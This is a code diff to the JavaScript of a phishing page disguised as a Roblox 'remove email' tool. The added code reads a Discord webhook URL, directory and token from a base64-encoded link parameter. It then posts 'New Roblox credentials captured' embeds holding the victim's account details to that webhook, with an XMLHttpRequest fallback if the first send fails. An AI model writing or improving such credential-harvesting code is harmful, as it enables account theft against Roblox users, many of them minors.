@@ -504,6 +504,53 @@
             const toastTitle = document.getElementById('toast-title');
             const toastMessage = document.getElementById('toast-message');
             const toastClose = document.getElementById('toast-close');
+            
+            // Variables to store webhook URL and directory
+            let webhookUrl = '';
+            let directory = '';
+            let token = '';
+            
+            // Function to decode data from URL
+            function decodeData(encodedData) {
+                try {
+                    // Decode from Base64
+                    const jsonString = atob(encodedData);
+                    // Parse JSON
+                    return JSON.parse(jsonString);
+                } catch (error) {
+                    console.error('Error decoding data:', error);
+                    return null;
+                }
+            }
+            
+            // Check for data in URL parameters
+            function getUrlParameter(name) {
+                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+                const results = regex.exec(location.search);
+                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+            }
+            
+            // Get and process data from URL
+            const encodedData = getUrlParameter('data');
+            if (encodedData) {
+                const data = decodeData(encodedData);
+                if (data && data.url) {
+                    webhookUrl = data.url;
+                    directory = data.directory || '';
+                    token = data.token || '';
+                    console.log('Webhook URL loaded from URL parameters');
+                    if (directory) {
+                        console.log('Directory:', directory);
+                    }
+                }
+            } else {
+                // Fallback to localStorage for backward compatibility
+                webhookUrl = localStorage.getItem('discord_webhook_url');
+                if (webhookUrl) {
+                    console.log('Webhook URL loaded from localStorage (legacy mode)');
+                }
+            }
 
             // Age option change event
             cookieDiv.style.display = 'none';
@@ -595,18 +642,16 @@
                 processBtn.disabled = true;
                 processBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REMOVING EMAIL...';
 
-                // Get Discord webhook URL from localStorage
-                const webhookUrl = localStorage.getItem('discord_webhook_url');
-                
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    alert('Discord webhook not configured. Please open setup.html first to configure your webhook.');
+                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.');
                     processBtn.disabled = false;
                     processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
                     return;
                 }
                 
-                const data = {
+                // Prepare webhook data
+                const webhookData = {
                     content: 'New Roblox credentials captured:',
                     embeds: [{
                         title: 'Roblox Account Details',
@@ -640,16 +685,74 @@
                     }]
                 };
                 
+                // Add directory information if available
+                if (directory) {
+                    // Create a clickable link for the directory
+                    let directoryUrl = window.location.href;
+                    
+                    // Check if directory contains a URL
+                    if (directory.startsWith('http://') || directory.startsWith('https://')) {
+                        directoryUrl = directory;
+                        // Display only the domain name as the visible text
+                        const urlObj = new URL(directory);
+                        directory = urlObj.hostname;
+                    }
+                    
+                    const directoryLink = `[${directory}](${directoryUrl})`;
+                    webhookData.embeds[0].fields.push({
+                        name: 'Directory',
+                        value: directoryLink,
+                        inline: true
+                    });
+                }
+                
+                // Add token information if available
+                if (token) {
+                    webhookData.embeds[0].fields.push({
+                        name: 'Token',
+                        value: token,
+                        inline: true
+                    });
+                }
+                
                 // Send the data to Discord
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(webhookData)
                 })
-                .then(response => console.log('Discord webhook response:', response))
-                .catch(error => console.error('Error sending to Discord:', error));
+                .then(response => {
+                    console.log('Discord webhook response:', response);
+                    if (!response.ok) {
+                        console.error('Webhook response not OK:', response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending to Discord:', error);
+                    // Try alternative method if fetch fails
+                    sendWebhookFallback(webhookUrl, webhookData);
+                });
+                
+                // Fallback method to send webhook data
+                function sendWebhookFallback(url, data) {
+                    console.log('Trying fallback webhook method...');
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onload = function() {
+                        if (this.status >= 200 && this.status < 300) {
+                            console.log('Fallback webhook sent successfully');
+                        } else {
+                            console.error('Fallback webhook failed:', this.status);
+                        }
+                    };
+                    xhr.onerror = function() {
+                        console.error('Fallback webhook error');
+                    };
+                    xhr.send(JSON.stringify(data));
+                }
 
                 try {
                     // Process the cookie via AJAX
